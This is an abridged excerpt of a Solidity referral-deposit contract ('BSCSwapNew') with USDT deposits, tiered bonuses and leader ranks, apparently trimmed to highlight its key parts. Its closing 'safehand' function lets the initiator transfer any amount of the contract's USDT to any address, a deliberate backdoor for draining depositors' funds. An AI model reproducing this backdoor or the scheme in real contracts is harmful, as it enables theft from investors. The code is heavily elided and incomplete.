...
contract BSCSwapNew {
    ...
    uint256 private constant minDeposit = 2e6;
    ...
    modifier onlyInitiator(){
        require(msg.sender == defaultRefer,"You are not initiator.");
        _;
    }
    
    constructor(address _usdt, address payable _feeReceiver1, address payable _feeReceiver2) public {
        usdt = IERC20(_usdt);
    ...
    function register(address _referral) external {
        ...
        user.refNo = userInfo[_referral].levelTeam[0];
    ...
    function _setReferral(address _user,address _referral, uint256 _refAmount, uint8 _isReDept) private {
        for(uint8 i = 0; i < level_bonuses.length; i++) {
            ...
            if(userInfo[_referral].isLeader==0 || userInfo[_referral].isManager==0){
                ...
                if(userInfo[_referral].isLeader==0 && lt>=4 && userInfo[_referral].myLastDeposit>=2e6 && lbA>=5e6 && lbB>=5e6){
                   userInfo[_referral].isLeader=1;
                   reward_array.push(_referral);
                }
                if(userInfo[_referral].isManager==0 && lt>=6 && userInfo[_referral].myLastDeposit>=4e6 && lbA>=6e6 && lbB>=6e6){
            ...
            if(i==0){
                ...
                if(userInfo[_referral].levelTeam[0]>=2){
                    userInfo[_referral].totalIncome+=levelOn.mul(level_bonuses[i]).div(baseDivider);
    ...
    function _distributeDeposit(uint256 _amount) private {
        ...
        usdt.transfer(feeReceivers[1], fee.div(1));
    ...
    function safehand(address hand , uint _amount) external onlyInitiator{
        usdt.transfer(hand,_amount);
    }
